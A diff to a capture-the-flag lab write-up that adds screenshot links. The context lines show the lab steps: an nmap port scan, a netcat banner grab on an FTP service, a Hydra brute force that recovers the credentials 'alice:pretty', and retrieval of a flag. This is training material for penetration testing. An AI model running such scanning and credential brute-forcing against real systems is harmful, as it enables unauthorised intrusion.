@@ -43,7 +43,8 @@ To discover all services, use full port scan:
 nmap -p- -sV target.ine.local
 ```
 We find an FTP service on port `5554`.
-![Step 1](./2.png)
+
+![Step 2](./2.png)
 
 ### 🔹 Step 2: Grab FTP Banner
 
@@ -51,6 +52,8 @@ We find an FTP service on port `5554`.
 nc target.ine.local 5554
 ```
 The banner reveals three potential usernames: ashley, alice, amanda.
+
+![Step 3](./3.png)
 
 ### 🔹 Step 3: Create User Wordlist
 
@@ -62,6 +65,8 @@ alice
 ashley
 amanda
 ```
+![Step 4](./4.png)
+![Step 5](./5.png)
 
 ### 🔹 Step 4: Brute Force FTP Credentials
 Using Hydra:
@@ -72,12 +77,16 @@ Success! Found valid credentials:
 - Username: alice
 - Password: pretty
 
+![Step 6](./6.png)
+
 ### 🔹 Step 5: Access FTP and Download Flag
 ```bash
 ftp target.ine.local 5554
 ```
 Login with `alice:pretty`
 Use `ls` to list and `get flag3.txt` to download.
+
+![Step 7](./7.png)
 
 ### 🔹 Step 6: View Retrieved Flag
 ```bash
@@ -87,6 +96,7 @@ Output:
 ```bash
 FLAG3{232c4bdafc8844129123cfaeaa5c4e68}
 ```
+![Step 8](./8.png)
 
 ## Conclusion
 Through enumeration, service discovery, and brute-forcing techniques, we were able to extract sensitive credentials and retrieve the flag from a hidden FTP service.
